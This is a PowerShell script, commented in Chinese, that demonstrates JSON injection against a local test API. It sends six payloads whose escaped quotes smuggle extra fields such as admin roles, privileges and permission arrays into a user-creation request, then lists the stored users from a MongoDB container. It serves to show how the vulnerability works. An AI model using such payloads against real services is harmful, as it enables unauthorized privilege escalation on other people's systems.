# 完整的JSON注入攻击演示脚本

Write-Host "=== JSON注入漏洞演示 ===" -ForegroundColor Cyan
Write-Host "目标API: http://localhost:3000/api/user/create" -ForegroundColor Yellow
Write-Host ""

# 函数：发送请求并显示结果
function Test-JsonInjection {
    param(
        [string]$Description,
        [string]$Payload
    )
    
    Write-Host "🎯 测试: $Description" -ForegroundColor Green
    Write-Host "📦 Payload: $Payload" -ForegroundColor Gray
    
    try {
        $result = Invoke-RestMethod -Uri "http://localhost:3000/api/user/create" -Method Post -ContentType "application/json" -Body $Payload
        Write-Host "✅ 结果: $result" -ForegroundColor Yellow
    } catch {
        Write-Host "❌ 错误: $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host "---"
}

# 1. 正常请求
Test-JsonInjection -Description "正常用户创建" -Payload '{"username": "normaluser"}'

# 2. 注入额外字段
Test-JsonInjection -Description "注入额外字段" -Payload '{"username": "hacker\", \"injected\": \"field\", \"malicious\": \"true"}'

# 3. 尝试修改权限（会被覆盖）
Test-JsonInjection -Description "尝试修改权限（会被后续字段覆盖）" -Payload '{"username": "attacker\", \"privilege\": \"admin"}'

# 4. 注入多个恶意字段
Test-JsonInjection -Description "注入多个恶意字段" -Payload '{"username": "evil\", \"role\": \"admin\", \"access\": \"full\", \"bypass\": \"true"}'

# 5. 尝试注入数组
Test-JsonInjection -Description "尝试注入数组结构" -Payload '{"username": "array_user\", \"permissions\": [\"read\", \"write\", \"admin\"], \"level\": 10}'

# 6. 注入嵌套对象
Test-JsonInjection -Description "注入嵌套对象" -Payload '{"username": "nested\", \"metadata\": {\"type\": \"admin\", \"level\": 100}, \"secret\": \"key"}'

Write-Host ""
Write-Host "=== 查看所有创建的用户 ===" -ForegroundColor Cyan
Write-Host "正在从MongoDB获取数据..." -ForegroundColor Gray

# 显示MongoDB中的数据
docker exec -it json_-mongo-1 mongosh --eval "db = db.getSiblingDB('testDB'); db.users.find().sort({_id: -1}).limit(10).pretty()"
